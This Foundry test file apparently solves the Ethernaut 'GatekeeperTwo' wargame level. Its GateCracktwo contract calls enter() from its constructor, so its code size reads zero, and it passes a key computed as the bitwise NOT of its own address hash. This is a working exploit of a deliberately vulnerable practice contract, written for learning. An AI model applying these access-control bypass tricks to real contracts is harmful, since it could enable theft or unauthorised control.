pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/14-gatetwo.sol";

contract Gatetwo14Test is Test {
    GatekeeperTwo gktwo;
    GateCracktwo gcrack;

    function setUp() public {
        emit log_string("🧪 Setup Gatetwo Test...");
        gktwo = new GatekeeperTwo();
    }

    function testGateTwo() public {
        emit log_string("🧪 Cracking Gatetwo ...");

        address bob = mkaddr("bob");
        vm.deal(bob, 100 ether);
        vm.startPrank(bob, bob);

        gcrack = new GateCracktwo(address(gktwo));
        vm.stopPrank();
        emit log_named_address("Entrant Address is:", gktwo.entrant());
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}

contract GateCracktwo is Test {
    address public addr;

    constructor(address _addr) public {
        addr = _addr;
        bytes8 _bt = ~(
            bytes8((uint64(bytes8(keccak256(abi.encodePacked(address(this)))))))
        );
        bool success = IGatekeeperTwo(_addr).enter(_bt);
    }

    receive() external payable {}
}

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}
